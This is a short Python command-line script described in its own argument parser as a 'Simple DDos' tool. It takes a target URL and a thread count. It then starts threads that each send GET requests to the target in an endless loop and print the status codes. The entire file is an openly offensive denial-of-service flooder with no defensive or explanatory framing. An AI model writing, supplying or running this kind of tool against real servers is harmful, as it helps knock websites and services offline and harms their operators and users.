import requests
import threading
import sys
import argparse

parser = argparse.ArgumentParser("Simple DDos Parser")
parser.add_argument("url", help="Target Url to attack.", type=str)
parser.add_argument("threads", help="Threads are required and must be grater than 1.", type=int, default=10, nargs="?")

args = parser.parse_args()

try:
    requests.get(args.url)
except:
    print("Either the url is invalid or the server is down, make sure your url is correct and have the http|https protocol.")
    sys.exit(0)

if args.threads < 1:
    print("Threads must be grater than 1.")
    sys.exit(0)


print("Attacking target url: " + args.url + " with " + str(args.threads) + " threads.")

def send_req():
    while(True):
        url = args.url
        r = requests.get(url)
        print(r.status_code)

threadList = []
for i in range(args.threads):
    t = threading.Thread(target=send_req)
    t.start()
    threadList.append(t)

for t in threadList:
    t.join()